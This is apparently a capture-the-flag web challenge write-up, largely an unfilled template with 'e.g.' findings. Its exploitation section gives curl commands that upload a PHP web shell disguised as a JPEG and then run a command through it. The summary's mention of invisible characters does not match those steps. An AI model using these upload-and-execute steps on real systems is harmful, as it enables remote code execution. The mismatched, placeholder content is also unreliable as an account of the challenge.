# Hidden Path
**Date**: 2025-05-16  
**Category**: Web 

## Table of Contents
- [Summary](#summary)
- [Reconnaissance & Enumeration](#reconnaissance--enumeration)
- [Exploitation](#exploitation)
- [Takeaways & Lessons Learned](#takeaways--lessons-learned)

---

## Summary
Find the use of hidden invisible characters and url encode to manipulate post methods.

---

## Reconnaissance & Enumeration
1. **Passive Recon**  
   - Tools: `whatweb`, `dig`, code comments  
   - Findings: e.g. `/verification` upload endpoint, Flask app, Bootstrap front end  
2. **Active Recon**  
   - Tools: Gobuster, Burp crawl, JS/​XHR analysis  
   - Findings: e.g. `/uploads/`, `/static/images/`, protected `/admin`  

---

## Exploitation
```bash
# Example steps
curl -F "file=@shell.php.jpg;type=image/jpeg" \
     http://TARGET/verification

curl "http://TARGET/uploads/shell.php.jpg?cmd=id"
```

## Takeaways & Lessons Learned
- Invisible characters